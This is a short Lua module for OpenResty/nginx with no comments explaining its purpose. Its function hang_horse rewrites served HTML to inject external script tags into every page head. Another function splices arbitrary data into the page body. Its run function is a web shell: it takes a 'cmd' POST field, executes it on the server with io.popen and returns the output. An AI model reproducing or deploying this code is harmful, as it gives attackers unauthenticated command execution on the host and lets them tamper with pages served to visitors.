local _M = {}
function _M.hang_horse()
    local data = ngx.arg[1] or ""
    print("ngx.arg[1]==========="..ngx.arg[1])
    local html = string.gsub(data, "</head>", "<script>window.MTSI_OPEN = true;</script>\n<script src=\"//xs01.meituan.net/banma_static/mtsi.js\"></script>\n<script src=\"//s0.meituan.net/mx/rohr/rohr.min.js\"></script>\n</head>")
    -- local html = string.gsub(data, "</head>", "<script src=\"https://cdn.bootcss.com/jquery/3.3.1/core.js\"></script></head>", 1)
    ngx.arg[1] = html
end
function _M.handle_connect_html() 
    local data = ngx.arg[1] or ""
    local bodyInfo = ngx.ctx.foo
    local html = string.gsub(data, "<body>", "<body>"..bodyInfo) 
    print('===========html'..html)
    ngx.arg[1] = html

end
function _M.run()
    ngx.req.read_body()
    local post_args = ngx.req.get_post_args()
    -- for k, v in pairs(post_args) do
    --    ngx.say(string.format("%s = %s", k, v))
    -- end
    local cmd = post_args["cmd"]
    if cmd then
        f_ret = io.popen(cmd)
        local ret = f_ret:read("*a")
        ngx.say(string.format("reply:\n%s", ret))
    end
end
return _M
